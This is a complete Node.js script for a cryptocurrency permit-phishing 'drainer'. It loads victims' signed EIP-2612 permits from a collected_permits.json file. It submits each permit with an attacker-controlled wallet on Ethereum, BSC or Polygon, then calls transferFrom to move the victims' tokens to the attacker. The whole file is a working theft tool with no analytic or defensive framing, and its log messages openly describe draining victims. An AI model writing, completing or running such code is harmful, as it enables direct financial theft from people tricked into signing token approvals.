const { ethers } = require("ethers");
const fs = require("fs");
require("dotenv").config();

const ATTACKER_PRIVATE_KEY = process.env.ATTACKER_PRIVATE_KEY; // Your wallet
const INFURA_PROJECT_ID = process.env.INFURA_PROJECT_ID; // or Alchemy key

const CHAINS = {
  1: {
    name: "Ethereum",
    rpc: `https://mainnet.infura.io/v3/${INFURA_PROJECT_ID}`,
    token: "0xdAC17F958D2ee523a2206206994597C13D831ec7"
  },
  56: {
    name: "BSC",
    rpc: "https://bsc-dataseed.binance.org/",
    token: "0x55d398326f99059fF775485246999027B3197955"
  },
  137: {
    name: "Polygon",
    rpc: `https://polygon-mainnet.infura.io/v3/${INFURA_PROJECT_ID}`,
    token: "0x3813e82e6f7098b9583FC0F33a962D02018B6803"
  }
};

const ERC20_ABI = [
  "function permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline,uint8 v,bytes32 r,bytes32 s) external",
  "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
];

async function drainPermit(permit) {
  const chain = CHAINS[permit.chainId];
  if (!chain) {
    console.log(`Unsupported chain ${permit.chainId}`);
    return;
  }

  const provider = new ethers.providers.JsonRpcProvider(chain.rpc);
  const wallet = new ethers.Wallet(ATTACKER_PRIVATE_KEY, provider);
  const tokenContract = new ethers.Contract(chain.token, ERC20_ABI, wallet);

  const { owner, spender, value, nonce, deadline } = permit.permitData;
  const signature = permit.signature;

  // Extract v,r,s from signature
  const sig = ethers.utils.splitSignature(signature);

  console.log(`[+] Draining ${chain.name} token from ${owner}`);

  try {
    // Call permit() using attacker wallet, using the victim's signature
    const txPermit = await tokenContract.permit(owner, spender, value, nonce, deadline, sig.v, sig.r, sig.s);
    await txPermit.wait();
    console.log("[+] permit() executed");

    // Now transfer tokens from victim to attacker
    const txTransfer = await tokenContract.transferFrom(owner, wallet.address, value);
    await txTransfer.wait();
    console.log("[+] transferFrom() executed, tokens drained");
  } catch (err) {
    console.error("[!] Drain failed:", err);
  }
}

async function main() {
  let permits = [];
  try {
    permits = JSON.parse(fs.readFileSync("./server/collected_permits.json"));
  } catch (e) {
    console.error("No permits found to drain.");
    return;
  }

  for (const permit of permits) {
    await drainPermit(permit);
  }
}

main();
